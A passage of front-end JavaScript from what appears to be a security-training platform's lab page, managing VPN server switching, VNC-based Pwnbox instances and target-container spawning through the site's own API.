          let _continueVpnSwitchBtnText = $('#continueVpnSwitchBtnText');
          let _cancelVpnSwitchBtn = $('#cancelVpnSwitchBtn');
          let _vpnSwitchWarningModalLoader = $('.vpnSwitchModalLoader');

          // Modal for warning the user about switching to an overloaded server
          let _overloadedVpnWarningModal = $('#overloadedVpnWarningModal');

          // Modal for informing the user already being on an overloaded server
          let _overloadedVpnInfoModal = $('#overloadedVpnInfoModal');

          // Reverts the selected server to the last selected server
          function cancelVpnServerChange() {
            _overloadedVpnWarningModal.modal('hide');
            _vpnSelector.val(_selectedServer);
            _vpnSelector.selectpicker('refresh');
          }

          _overloadedVpnWarningModal.find('#stayToVpnServerWarning, .close').on('click', () => {
            cancelVpnServerChange();
          });

          _overloadedVpnWarningModal.find('#overloadedVpnServerWarningAction').on('click', () => {
            localStorage.setItem(overLoadedVpnServerStatusKey, JSON.stringify('complete'));
            _overloadedVpnWarningModal.modal('hide');
            switchVpnServer(true);
          });

          _overloadedVpnInfoModal.find('#stayToVpnServerInfo, #overloadedVpnInfoAction, .close').on('click', () => {
            _vpnSelector.val(_selectedServer);
            _vpnSelector.selectpicker('refresh');
            _overloadedVpnInfoModal.modal('hide');
          });

          _overloadedVpnInfoModal.on('hidden.bs.modal', () => {
            localStorage.setItem(overLoadedVpnServerStatusKey, JSON.stringify('complete'));
          });

          _vpnSelector.change(function () {
              if (isPwnboxActive) {
                _vpnSwitchWarningModal.modal('show');
              } else {
                let vpnLoadLevel = $('.vpnSelector option:selected').data('level');
                if (vpnLoadLevel >= 70) {
                    _overloadedVpnWarningModal.modal('show');
                } else {
                    switchVpnServer();
                }
              }
          });

          function switchVpnServer(displayError = true) {
            let vpnId = $('.vpnSelector option:selected').val();
            if (!vpnId) return;

            _vpnLoader.removeClass('d-none');
            _vpnLoader.addClass('d-flex');
            $('.bootstrap-select').addClass('d-none');

            // Display button loader and disable the buttons while
            // waiting for the request to finish
            _continueVpnSwitchBtnText.addClass('d-none');
            _vpnSwitchWarningModalLoader.removeClass('d-none');
            _continueVpnSwitchBtn.addClass('disabled');
            _cancelVpnSwitchBtn.addClass('disabled');
            _vpnSwitchWarningModal.find('.close').addClass('disabled');

            axios.post(`/api/v2/vpn-servers/${vpnId}/switch`, {}).then(response => {
                _vpnLoader.removeClass('d-flex');
                _vpnLoader.addClass('d-none');
                $('.bootstrap-select').removeClass('d-none');

                toastr['success']('Vpn server switched successfully', 'Success');
                $('.startInstanceBtn').each(function () {
                    $(this).removeClass('disabled');
                });

                _selectedServer = _vpnSelector.val();
                _vpnSwitchWarningModal.modal('hide');
                _continueVpnSwitchBtnText.removeClass('d-none');
                _vpnSwitchWarningModalLoader.addClass('d-none');
                _continueVpnSwitchBtn.removeClass('disabled');
                _cancelVpnSwitchBtn.removeClass('disabled');
                _vpnSwitchWarningModal.find('.close').removeClass('disabled');

                if (isTargetActive) {
                    $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
                    $('.targetIp').html('<i class="fad fa-circle-notch fa-spin"></i>');
                    $('.target-protocol-ip').html('<i class="fad fa-circle-notch fa-spin"></i>');
                    $('.resetTargetBtn').hide();
                    $('.resetTargetBtn').prop('disabled', true);

                    vmCheckTimer = setInterval(function () {
                        window.checkMultipleVMs();
                    }, 5 * 1000);
                }

            }).catch(err => {
                clearInterval(vmCheckTimer);
                _vpnLoader.removeClass('d-flex');
                _vpnLoader.addClass('d-none');
                $('.bootstrap-select').removeClass('d-none');
                if(displayError) {
                    toastr['error'](err.response.data.message, 'Error');
                }
                _vpnSelector.val(_selectedServer);
                $('.selectpicker').selectpicker('refresh')
                _vpnSwitchWarningModal.modal('hide');
                _continueVpnSwitchBtnText.removeClass('d-none');
                _vpnSwitchWarningModalLoader.addClass('d-none');
                _continueVpnSwitchBtn.removeClass('disabled');
                _cancelVpnSwitchBtn.removeClass('disabled');
                _vpnSwitchWarningModal.find('.close').removeClass('disabled');
            });

          }

          _continueVpnSwitchBtn.on('click', () => {
              switchVpnServer();
          });

          _vpnSwitchWarningModal.find('.close').on('click', () => {
              _vpnSelector.val(_selectedServer);
              _vpnSwitchWarningModal.modal('hide');
          });

          _cancelVpnSwitchBtn.on('click', () => {
              _vpnSelector.val(_selectedServer);
              _vpnSwitchWarningModal.modal('hide');
          });

          _vpnSwitchWarningModal.on('hidden.bs.modal', () => {
              _continueVpnSwitchBtnText.removeClass('d-none');
              _vpnSwitchWarningModalLoader.addClass('d-none');

              // Reset button state on modal close
              _continueVpnSwitchBtn.removeClass('disabled');
              _cancelVpnSwitchBtn.removeClass('disabled');
              _vpnSwitchWarningModal.find('.close').removeClass('disabled');
          });

      });

      $('.download-vpn-settings').click(() => {
          let type = 'regular';
          let protocol = $('input[name="vpn-protocol"]:checked').val();
          axios.get(`/api/v2/vpn-servers/key/download?type=${type}&protocol=${protocol}`).then(response => {
              const url = window.URL.createObjectURL(new Blob([response.data]));
              const link = document.createElement('a');
              link.href = url;
              link.setAttribute('download', `academy-${type}.ovpn`);
              document.body.appendChild(link);
              link.click();
          }).catch(err => {
              toastr['error'](err.response.data.message, 'Error');
          });
      });

      $('#completeBtn').click(() => {
          $('#completeBtn').addClass('disabled');
          $('#complete-button-text').addClass('d-none');
          $('#complete-button-loader').removeClass('d-none');
      });

      function completeCheck() {
          axios.get('/api/check/complete/183').then(response => {
              let data = response.data;
              if (data.success === 1) {
                  if (data.completed === true) {
                      $('#completeBtn').show();
                      $('#completeBtnPoints').removeClass('d-none');
                  }
              }
          }).catch(err => {
              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
          });
      }

      function wrapTerminal(element, heading) {
          $(element).css('line-height', '0px');
          $(element).wrap('<div class="window_content"></div>')
              .parent().wrap('<div class="window_container"></div>')
              .prepend(`
                      <div class='window_top'>
                          <span class='window_dot bg-danger'></span>
                          <span class='window_dot bg-warning'></span>
                          <span class='window_dot bg-success'></span>
                          <span class='window_title'>${heading}</span>
                      </div>
                  `);
      }

      function wrapPSTerminal(element, heading) {
          $(element).css('background', '#012456').children().css('color', 'white');
          $(element).css('line-height', '0px');
          $(element).wrap('<div class="window_content"></div>')
              .parent().wrap('<div class="window_container"></div>')
              .prepend(`
                      <div class='window_top'>
                          <span class='window_dot bg-danger'></span>
                          <span class='window_dot bg-warning'></span>
                          <span class='window_dot bg-success'></span>
                          <span class='window_title'>${heading}</span>
                      </div>
                  `);
      }

      function wrapCMDTerminal(element, heading) {
          $(element).css('background', 'black').children().css('color', 'white');
          $(element).css('line-height', '0px');
          $(element).wrap('<div class="window_content"></div>')
              .parent().wrap('<div class="window_container"></div>')
              .prepend(`
                      <div class='window_top'>
                          <span class='window_dot bg-danger'></span>
                          <span class='window_dot bg-warning'></span>
                          <span class='window_dot bg-success'></span>
                          <span class='window_title'>${heading}</span>
                      </div>
                  `);
      }

      function wrapCodeBlock(element, lang) {
          $(element).wrap('<div class="window_content"></div>')
              .parent().wrap('<div class="window_container"></div>')
              .prepend('<div class="window_top">Code: <span class="text-success">' + lang + '</div>');
      }

      function wrapBrowserOld(element) {
          $(element).css('border', '0px').css('border-radius', '0');
          let url = element.data('url');
          $(element).wrap('<div class="window_content"></div>')
              .parent().wrap('<div class="window_container"></div>')
              .prepend(`
                      <div class='window_top'>
                          <span class='window_dot bg-danger'></span>
                          <span class='window_dot bg-warning'></span>
                          <span class='window_dot bg-success'></span>
                          <input type='text' class='website-screenshot-url' disabled value='${url}'>
                          <span class='float-right'><i class='fa fa-home'></i></span>
                      </div>
                  `);
      }

      function wrapBrowser(element) {
          $(element).css('border', '0px').css('border-radius', '0');

          $(element).each(function (index, e) {
              let url = $(e).data('url');
              $(e).wrap('<div class="window_content"></div>')
                  .parent().wrap('<div class="window_container"></div>')
                  .prepend(`
                          <div class='window_top'>
                              <span class='mr-2'>
                                  <i class='fa fa-arrow-circle-left'></i> <i class='fa fa-arrow-right'></i> <i class='fa fa-redo'></i> <i class='fa fa-home'></i>
                              </span>
                              <input type='text' class='website-screenshot-url' disabled value='${url}'>
                              <span class='float-right'><i class='fa fa-bars'></i></span>
                          </div>
                      `);
          });
      }

      // This one is used by the requestHelpModal
      function requestHelp() {
          let question_id = $('#requestHelpModal').data('question_id');
          axios.post(`/api/question/${question_id}/help`)
              .then(({ data }) => {
                  $('#requestHelpModal').modal('hide');
                  if (data.success == 0) {
                      toastr['error'](data.message, 'Error');
                      return;
                  }
                  toastr['success']('Request sent!', 'Success');
              }).catch(err => {
                  toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
              });
      }

      function openRequestModal(question_id) {
          $('#requestHelpModal').modal('show').data('question_id', question_id);
      }

      function openSolutionPreferencesModal() {
        $('#solutionPreferencesModal').modal('show');
      };

      function openWalkthroughModal(index, sectionTitle) {
          let _walkthrougModal = $('#walkthroughModal');
          const _walkthroughContent = $('#walkthroughModal').find('.training-module');
          const _walkthroughLoader = $('.walkthrough-loader');
          _walkthrougModal.modal('show');
          _walkthrougModal.on('shown.bs.modal', function (event) {
              const indexNumber = new Number(index);

              _walkthroughLoader.removeClass('d-none');
              _walkthroughLoader.addClass('d-block');

              let question = `Question ${indexNumber + 1}`;
              let element = $('h1').filter(function () {
                  // Filter all the h1 headers, to find the exact section title
                  return $(this).text().trim().toLowerCase() === sectionTitle.toLowerCase();
              }).nextAll('h2').filter(function () {
                  // then filter all the h2 headers, to find the exact question as well
                  return $(this).text().trim().toLowerCase() === question.toLowerCase();
              }).first();

              if (element.length) {
                  setTimeout(() => {
                      _walkthroughLoader.addClass('d-none');
                      _walkthroughLoader.removeClass('d-block');
                      _walkthroughContent.removeClass('d-none');

                      _walkthrougModal.animate({
                          scrollTop: element.offset().top - _walkthrougModal.offset().top + _walkthrougModal.scrollTop()
                      }, 500);
                  }, 1500);
              } else {
                  _walkthroughLoader.addClass('d-none');
                  _walkthroughLoader.removeClass('d-block');
                  _walkthroughContent.removeClass('d-none');
              }
          });
          _walkthrougModal.on('hidden.bs.modal', function (event) {
              // Make sure that content gets hidden again
              // in case the user re-opens the modal multiple times
              _walkthroughContent.addClass('d-none');
          });
      }

      
      function initStreakToast(autoHideOption = true) {
          const streakToast = $('#streak-toast');
          streakToast.toast({ autohide: autoHideOption, delay: 20000 }).toast('show');
      }

      function initStreaksNotificationContent(streaksTemplate) {
          return new Promise((resolve, reject) => {
              const _streaksContainer = $('.streaks-container');
              _streaksContainer.html(streaksTemplate);
              resolve();
          });

      }
</script>

<script type="module">
    import RFB from '/assets/libs/vnc/core/rfb.js';

      let rfb;
      let sidePreview;
      let desktopName;
      let pwnboxActive = false;
      $(document).ready(function () {
          getRegions();
          const userId = '1007514';
          Echo.private(`user-${userId}`)
              .listen('.streak.completed', data => {
                  initStreaksNotificationContent(data.streak_popup).then(() => {
                      initStreakToast();
                  });
              })
              .listen('.streak.progressed', data => {
                  initStreaksNotificationContent(data.streak_popup).then(() => {
                      initStreakToast();
                  });
              })
              .listen('.streak.started', data => {
                  const { event, current_streak } = data.streak_data;
                  initStreaksNotificationContent(data.streak_popup).then(() => {
                    const enableToastAutohide = event === 'streak.started' && current_streak === 0 ? false : true;
                    initStreakToast(enableToastAutohide);
                  });
              });
      });

      function connectedToServer(e) {
          status('Connected to ' + desktopName);
          $('.fullScreenBtn').show();
          $('.resetInstanceBtn').show();
          $('.terminateInstanceBtn').show();
          $('.extendInstanceBtn').show();
          $('.instanceLoading').hide();
          $('.instanceStart').hide();
          $('.resetInstanceBtn').prop('disabled', false);
          $('.fullScreenBtn').prop('disabled', false);
          $('.extendInstanceBtn').prop('disabled', false);
          $('.terminateInstanceBtn').prop('disabled', false);

          document.querySelector('canvas').addEventListener('focus', (event) => {
              if (currentBrowser.firefox) {
                  window.copyToClipboard(event.target.textContent);
              } else {
                  navigator.clipboard.readText()
                      .then(text => {
                          writeToClipboard(text);
                      })
                      .catch(err => {
                          console.error('Something went wrong while accessing clipboard', err);
                      });
              }
          });
      }

      function disconnectedFromServer(e) {
          status('Disconnected');
          $('.screenPlaceholder').show();
          stopCountdown();
      }

      function clipboardReceived(e) {
          navigator.clipboard.writeText(e.detail.text)
              .then(() => {
                  // Success!
              })
              .catch(err => {
                  console.error('Something went wrong while copying to clipboard.', err);
              });
      }

      function updateDesktopName(e) {
          desktopName = e.detail.name;
      }

      function status(text) {
          $('#statusText').html(text);
      }

      function readQueryVariable(name) {
          const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
              match = document.location.href.match(re);

          if (match) {
              return decodeURIComponent(match[1]);
          }

          return null;
      }

      function writeToClipboard(text) {
          rfb.clipboardPasteFrom(text);
      }

      let host = '';
      let password = '';
      let countdown = '';
      let targetCountdown = '';
      let targetRemainingTimeInSeconds = '';
      let url = '';
      let spawnInterval = null;

      function getPwnbox() {
          return new Promise((resolve, reject) => {
              axios.get('/api/get/pwnbox').then(response => {
                  let data = response.data;
                  if (data.success === 1 && data.instance.status === 'ready') {
                      host = `proxy-${data.instance.location}.htb-cloud.com/bird/${data.instance.hostname}`;
                      password = data.instance.password;
                      $('.lifeLeft').html(data.instance.life_remaining);
                      startCountdown();
                      $('.screenPlaceholder').hide();
                      url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
                      isPwnboxActive = true;

                      if (document.querySelector('wc-htb-pwnbox-selection-card')) {
                          document.querySelector('wc-htb-pwnbox-selection-card').setAttribute('pwnbox-active', true);
                      }
                      connect();
                      if (spawnInterval !== null) {
                          clearInterval(spawnInterval);
                      }
                      resolve('success getting pwnbox');
                  } else {
                      $('.screenPlaceholder').show();
                  }
              }).catch(err => {
                  toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
                  reject(err);
              });
          });
      }

                function extendPwnbox() {
              axios.get('/api/extend/pwnbox').then(response => {
                  let data = response.data;
                  if (data.success === 1) {
                      $('.lifeLeft').html(data.instance.life_remaining);
                      stopCountdown().then(() => {
                          startCountdown();
                          toastr['success']('Time extended for 60 minutes.', 'Success');
                      });
                  } else {
                      toastr['error'](data.message, 'Error');
                  }

              }).catch(err => {
                  toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
              });
          }

      
      function initStartCountdown() {
          let life = parseInt($('.lifeLeft').html()) - 1;
          $('.lifeLeft').html(life);
      }

      function startCountdown() {
          countdown = setInterval(function () {
              initStartCountdown();
          }, 60 * 1000);
      }

      function stopCountdown() {
          return new Promise((resolve) => {
              clearInterval(countdown);
              resolve();
          });
      }

      function terminatePwnbox() {
          return new Promise((resolve, reject) => {
              $('.resetInstanceBtn').prop('disabled', true);
              $('.terminateInstanceBtn').prop('disabled', true);
              $('.fullScreenBtn').prop('disabled', true);
              $('.extendInstanceBtn').prop('disabled', true);
              $('.instanceStart').hide();

              $('.instanceTerminating').show();

              status('Terminating Interactive Instance...');

              axios.delete('/api/terminate/pwnbox')
                  .then(({ data }) => {
                      if (data.success === 1) {
                          $('.startInstanceBtn').show();
                          $('.instanceStart').show();
                          $('.instanceTerminating').hide();
                          $('.resetInstanceBtn').hide();
                          $('.terminateInstanceBtn').hide();
                          $('.fullScreenBtn').hide();
                          $('.extendInstanceBtn').hide();

                          isPwnboxActive = false;

                          $('.iterminal').addClass('d-none');

                          toastr['success']('Instance has been terminated.', 'Success');

                          /**
                           *  Dispatch an event when pwnBox is terminated
                           */
                          var terminatePwnBoxEvent = new CustomEvent('TerminatedPwnBox');
                          window.dispatchEvent(terminatePwnBoxEvent);

                          resolve('succes terminating pwnbox');

                      } else {
                          toastr['error'](data.message, 'Error');
                          connect();
                          $('.resetInstanceBtn').prop('disabled', false);
                          $('.fullScreenBtn').prop('disabled', false);
                          $('.extendInstanceBtn').prop('disabled', false);
                          $('.terminateInstanceBtn').prop('disabled', false);
                      }
                  }).catch(err => {
                      reject(err);
                      toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
                  });
          }).catch(error => {
              reject(error);
          });
      }

      let _wcPwnbox = document.querySelector('wc-htb-pwnbox-selection-card');

      function errorHandling(value) {
          switchToRegion = value.detail[0];
          _pwnboxSwitchWarningModal.modal('show');
      }

      function getSelectedPwnboxLocation(event) {
          if (pwnboxActive) {
              selectedPwnBoxLocation = currentPwnboxLocation;
              return;
          }
          selectedPwnboxLocation = event.detail[0];
      }

      function getCurrentPwnboxLocation(server) {
          currentPwnboxLocation = server;
      }

      function setCurrentPwnboxServer(server) {
          _wcPwnbox.setAttribute('current-pwnbox', server);
      }

      let selectedPwnboxLocation;
      let currentPwnboxLocation;
      let switchToRegion;

      let pwnboxRegions;

      let _pwnboxSwitchWarningModal = $('#pwnboxSwitchWarningModal');
      let _cancelPwnboxSwitchBtn = $('#cancelPwnboxSwitchBtn');
      let _continuePwnboxSwitchBtn = $('#continuePwnboxSwitchBtn');
      let _continuePwnboxSwitchBtnText = $('#continuePwnboxSwitchBtnText');
      let _pwnboxSwitchModalLoader = $('.pwnboxSwitchModalLoader');

      _cancelPwnboxSwitchBtn.on('click', () => {
          initWcPwnbox(pwnboxRegions);
          _pwnboxSwitchWarningModal.modal('hide');
      });

      _continuePwnboxSwitchBtn.on('click', () => {
          _continuePwnboxSwitchBtnText.addClass('d-none');
          _pwnboxSwitchModalLoader.removeClass('d-none');
          _continuePwnboxSwitchBtn.addClass('disabled');
          _cancelPwnboxSwitchBtn.addClass('disabled');

          let oldCurrentPwnbox = selectedPwnboxLocation = currentPwnboxLocation = switchToRegion;

          $('.screenPlaceholder').show();
          $('.instanceStart').show();
                        rfb.disconnect();
                    sidePreview.disconnect();
          terminatePwnbox().then(() => {

              startPwnbox().then(() => {
                  _pwnboxSwitchWarningModal.modal('hide');
                  _continuePwnboxSwitchBtnText.removeClass('d-none');
                  _pwnboxSwitchModalLoader.addClass('d-none');
                  _continuePwnboxSwitchBtn.removeClass('disabled');
                  _cancelPwnboxSwitchBtn.removeClass('disabled');
                  initWcPwnbox(pwnboxRegions);
              }).catch(() => {
                  _pwnboxSwitchWarningModal.modal('hide');
                  _continuePwnboxSwitchBtnText.removeClass('d-none');
                  _pwnboxSwitchModalLoader.addClass('d-none');
                  _continuePwnboxSwitchBtn.removeClass('disabled');
                  _cancelPwnboxSwitchBtn.removeClass('disabled');
                  initWcPwnbox(pwnboxRegions);
              });
          }).catch(error => {
              toastr['error'](error.message, 'Error');
              currentPwnboxLocation = oldCurrentPwnbox;
              initWcPwnbox(pwnboxRegions);
          });
      });

      function initWcPwnbox(regions) {
          /**
           *  Creates pwnbox server select component
           */
          const pwnboxSelector = document.createElement('wc-htb-pwnbox-selection-card');
          pwnboxSelector.setAttribute('regions', JSON.stringify(regions));
          pwnboxSelector.setAttribute('current-pwnbox', JSON.stringify(currentPwnboxLocation));

          $('.pwnbox-select-card').html(pwnboxSelector);
          pwnboxSelector.addEventListener('getSelectedPwnboxLocation', getSelectedPwnboxLocation);
          pwnboxSelector.addEventListener('actionNotAllowed', errorHandling);
          selectedPwnboxLocation = currentPwnboxLocation;

          if (isPwnboxActive) document.querySelector('wc-htb-pwnbox-selection-card').setAttribute('pwnbox-active', true);
      }

      function getRegions() {
          axios.get('/api/v2/pwnbox/regions').then(response => {
              const data = response.data.data;
              currentPwnboxLocation = response.data.meta.currentRegion;
              const regions = [];

              const latencyPromises = data.map((region) => {
                  const item = { name: region.title, value: region.value };
                  // Use Promise.resolve to ensure each iteration of the loop returns a Promise
                  return Promise.resolve()
                      .then(() => getServerLatency(region.proxyLatencyURL))
                      .then((response) => {
                          item.latency = response;
                          regions.push(item);
                      });
              });

              pwnboxRegions = regions;

              Promise.all(latencyPromises).then(() => {
                  // This code will run after all the getServerLatency calls have completed

                  initWcPwnbox(regions);
                  /**
                   * getting pwnbox status and setting isPwnboxActive flag
                   * if isPwnboxActive is true we are passing the respective attribute to the web component
                   */
                  getPwnbox().then(() => {
                      if (isPwnboxActive) {
                          document.querySelector('wc-htb-pwnbox-selection-card').setAttribute('pwnbox-active', true);
                      }
                  });
              })
                  .catch((error) => {
                      // Handle any errors that occurred during the Promise.all chain
                      console.error('An error occurred:', error);
                  });

          }).catch(err => {
              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
          });
      }

      function startPwnbox() {
          return new Promise((resolve, reject) => {

              $('.resetInstanceBtn').prop('disabled', true);
              $('.fullScreenBtn').prop('disabled', true);
              $('.extendInstanceBtn').prop('disabled', true);
              $('.terminateInstanceBtn').prop('disabled', true);
              $('.instanceStart').hide();
              $('.instanceLoading').show();
              $('.startInstanceBtn').hide();

              status('Starting Interactive Instance...');

              grecaptcha.ready(function () {
                  grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', { action: 'spawnPwnbox' }).then(function (token) {
                      if (token) {
                          axios.get(`/api/spawn/pwnbox?g-recaptcha-response=${token}&region=${selectedPwnboxLocation.value}`).then(response => {
                              let data = response.data;
                              if (data.success === 1) {
                                  spawnInterval = setInterval(() => {
                                      getPwnbox();
                                  }, 2000);
                              } else {
                                  if (data.code === 1 || (data.code === 3 && isPwnboxActive)) {
                                      $('.resetInstanceBtn').prop('disabled', false);
                                      $('.fullScreenBtn').prop('disabled', false);
                                      $('.extendInstanceBtn').prop('disabled', false);
                                      $('.terminateInstanceBtn').prop('disabled', false);
                                      connect();

                                      if (data.code === 3) {
                                          $('.instanceLoading').hide();
                                          startCountdown();
                                      }
                                  } else {
                                      $('.startInstanceBtn').show();
                                      $('.instanceStart').show();
                                      $('.instanceLoading').hide();
                                  }

                                  toastr['error'](data.message, 'Error');
                              }
                              resolve('success start pwnbox');
                          }).catch(err => {
                              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
                          });
                      } else {
                          $('.resetInstanceBtn').prop('disabled', false);
                          $('.fullScreenBtn').prop('disabled', false);
                          $('.extendInstanceBtn').prop('disabled', false);
                          $('.terminateInstanceBtn').prop('disabled', false);
                          $('.instanceStart').show();
                          $('.instanceLoading').hide();
                          $('.startInstanceBtn').show();
                      }
                  });
              });
          }).catch(error => {
              reject(error);
          });
      }

      $('.fullScreenBtn').click(function () {
          window.open(url, '_blank');
      });

      $('.startInstanceBtn').click(function () {
          if (!selectedPwnboxLocation?.value) {
              toastr['warning']('Please select Pwnbox server', 'Warning');
              return;
          }
          startPwnbox(selectedPwnboxLocation.value);
      });

      $('.resetInstanceBtn').click(function () {
          $('.screenPlaceholder').show();
          $('.instanceStart').show();
                        rfb.disconnect();
              $('.iterminal').addClass('d-none');
              // This event is dispatched when the pwnbox is terminated and it is catched on the Terminal component
              // to set the pwnboxStatus to null
              let terminatePwnBoxEvent = new CustomEvent('TerminatedPwnBox');
              window.dispatchEvent(terminatePwnBoxEvent);
                    sidePreview.disconnect();
          startPwnbox(selectedPwnboxLocation.value);
      });

      $('.terminateInstanceBtn').click(function () {
          $('.screenPlaceholder').show();
          $('.instanceStart').show();
                        rfb.disconnect();
                    sidePreview.disconnect();
          terminatePwnbox();
      });

      $('.extendInstanceBtnClicker').click(function () {
          extendPwnbox();
      });

      $('.resetTargetBtn').click(function () {
          $('.resetTargetBtn').prop('disabled', true);
          $('.resetTargetBtn').hide();
          stopTargetCountdown().then(()=>{
                        spawnDocker();
                                  });
      });

      
      function connect() {
          status('Connecting to ' + host.split('/')[2] + '...');

                        rfb = new RFB(document.getElementById('screen'), 'wss://' + host,
                  { credentials: { password: password } });
          //Listeners
          rfb.addEventListener('desktopname', updateDesktopName);
          rfb.addEventListener('clipboard', clipboardReceived);

          rfb.resizeSession = true;
          rfb.viewOnly = false;
          
          sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
              { credentials: { password: password } });

          sidePreview.addEventListener('connect', connectedToServer);
          sidePreview.addEventListener('disconnect', disconnectedFromServer);

          sidePreview.resizeSession = false;
          sidePreview.viewOnly = true;
          sidePreview.scaleViewport = true;

          /**
           *  Dispatch an event when pwnBox is spawned
           */
          var spawnedPwnBoxEvent = new CustomEvent('SpawnedPwnBox');
          window.dispatchEvent(spawnedPwnBoxEvent);
      }


                $(document).on('click', '.spawnTargetBtn', function () {
              spawnDocker();
          });

        $('.target, .targetIp, .target-protocol-ip').click(e => {
          if ($('.resetTargetBtn').is(':hidden')) return;

            window.copyToClipboard($(e.target).html())
                .then(() => {
                    toastr['success']('Target copied to clipboard', 'Success');
                })
                .catch(err => {
                    console.log('Something went wrong while copying to clipboard.', err);
                });
        });

      let containerCheckTimer;

      function spawnDocker() {
          $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
          $('.target-protocol-ip').html('<i class="fad fa-circle-notch fa-spin"></i>');
          axios.get('/api/spawn/container/183').then(response => {
              let data = response.data;
              if (data.success === 1) {
                  containerCheckTimer = setInterval(function () {
                      checkContainer(true);
                  }, 3000);
              } else {
                  toastr['error']('Target failed to spawn. Please try again.', 'Error');
                  resetSpawnTargetSystemText();
              }
          }).catch(err => {
              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
          });
      }

      function displayActiveContainer(data) {
        clearInterval(containerCheckTimer);
        $('.target').html(`${data.instance.external_ip}:${data.instance.node_ports}`);
        $('.targetIp').html(data.instance.external_ip);

        const targetProtocolIp = `${data.instance.external_ip}:${data.instance.node_ports}`;
        $('.target-protocol-ip').html(targetProtocolIp);

        $('.resetTargetBtn').show();
        $('.resetTargetBtn').prop('disabled', false);
        $('.targetLifeTimeContainer').show();
        initializeTimeLeft(data.instance?.remaining_life_in_seconds);
        stopTargetCountdown().then(() => {
            startTargetCountdown();
        });
      }

      function checkContainer(showAlert = false) {
          return axios.get('/api/get/container/183').then(({ data }) => {
            if (data.success === 1) {
                if (data.instance.status === 'ready') {
                    displayActiveContainer(data);
                }
            }

            return data;
          }).catch(err => {
                if (showAlert) {
                    toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
                }
          });
      }

      setTimeout(() => {
          checkContainer().then((data) => {
            if (data.success === 1) {
                if(data.instance.status === 'deploying') {
                    $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
                    containerCheckTimer = setInterval(function () {
                        checkContainer(false);
                    }, 5 * 1000);
                } else if (data.instance.status === 'ready') {
                    displayActiveContainer(data);
                }
            } else {
                resetSpawnTargetSystemText();
            }
          }).catch(err => {
            resetSpawnTargetSystemText();
          });
      }, 3000);
            
      
      function calculateTimeLeftInMinutes() {
          if (targetRemainingTimeInSeconds === null) {
            return 0;
          }
          targetRemainingTimeInSeconds -= 1;
          return Math.ceil(targetRemainingTimeInSeconds/60);
      }

      function initializeTimeLeft(remainingTime){
        targetRemainingTimeInSeconds = remainingTime;
        renderLifeTimeLeft();
      }

      function renderLifeTimeLeft() {
        let life = calculateTimeLeftInMinutes();

        if (life <= 0) {
          $('.targetLifeTimeContainer').hide();
          clearInterval(targetCountdown);
          resetSpawnTargetSystemText();
        } else {
          $('.targetLifeTime').html(life);
        }
      }

      function startTargetCountdown() {
          targetCountdown = setInterval(function() {
            renderLifeTimeLeft();
          }, 1000);
      }

      function stopTargetCountdown() {
          return new Promise((resolve) => {
              clearInterval(targetCountdown);
              resolve();
          });
      }

      function resetSpawnTargetSystemText() {
          $('.resetTargetBtn').prop('disabled', true);
          $('.resetTargetBtn').hide();
          $('.targetIp').html("");
          $('.target-protocol-ip').html("");
          $('.targetLifeTimeContainer').hide();
          $('.target').html('<span class="spawnTargetBtn" style="cursor:pointer;">Click here to spawn the target system!</span>');
      }

      $(document).click(function(e) {
        if(
            !$('#htb-note-dummy-popup').is($(e.target))
            && $('#htb-note-dummy-popup').find($(e.target)).length === 0
            && !$('#htb-note-dummy-button').is($(e.target))
        ) {
            hideDummyNotesPopup(); // Call the function to hide the popup
        }
      });
</script>

<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;93dab43e9def9ee0&quot;,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfSpeedBrain&quot;:true,&quot;cfCacheStatus&quot;:true}},&quot;version&quot;:&quot;2025.4.0-1-g37f21b1&quot;,&quot;token&quot;:&quot;9d8cb854dbf443df9a649c27660a2bb6&quot;}" crossorigin="anonymous"></script>



<script type="text/javascript" async="" src="https://js.recurly.com/v4/recurly.js"></script><div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-t4s4uxf9fr6n" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah&amp;co=aHR0cHM6Ly9hY2FkZW15LmhhY2t0aGVib3guY29tOjQ0Mw..&amp;hl=fr&amp;v=Hi8UmRMnhdOBM3IuViTkapUP&amp;size=invisible&amp;cb=reyrxsnokwa1"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 